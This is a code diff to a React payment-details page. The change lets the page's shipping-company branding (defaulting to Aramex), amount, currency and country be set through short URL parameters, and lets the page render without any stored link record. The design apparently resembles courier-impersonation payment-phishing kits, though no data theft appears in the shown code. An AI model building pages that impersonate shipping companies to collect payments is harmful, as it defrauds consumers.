@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
@@ -17,6 +17,7 @@ import PageLoader from "@/components/PageLoader";
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
   const { data: linkData, isLoading, isError } = useLink(id);
   const [showPage, setShowPage] = useState(false);
 
@@ -28,22 +29,21 @@ const PaymentDetails = () => {
   }, []);
 
   useEffect(() => {
-    if (linkData || isError) {
+    if (linkData || isError || searchParams.get('service')) {
       setShowPage(true);
     }
-  }, [linkData, isError]);
+  }, [linkData, isError, searchParams]);
 
-  const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
+  const serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || 'aramex';
   const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
   
-  const amountParam = urlParams.get('amount');
-  const currencyParam = urlParams.get('currency');
-  const methodParam = urlParams.get('method') || urlParams.get('pm');
-  const countryParam = urlParams.get('country');
+  const amountParam = searchParams.get('amount') || searchParams.get('a');
+  const currencyParam = searchParams.get('currency');
+  const methodParam = searchParams.get('method') || searchParams.get('pm');
+  const countryParam = searchParams.get('country') || searchParams.get('c');
   
   const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
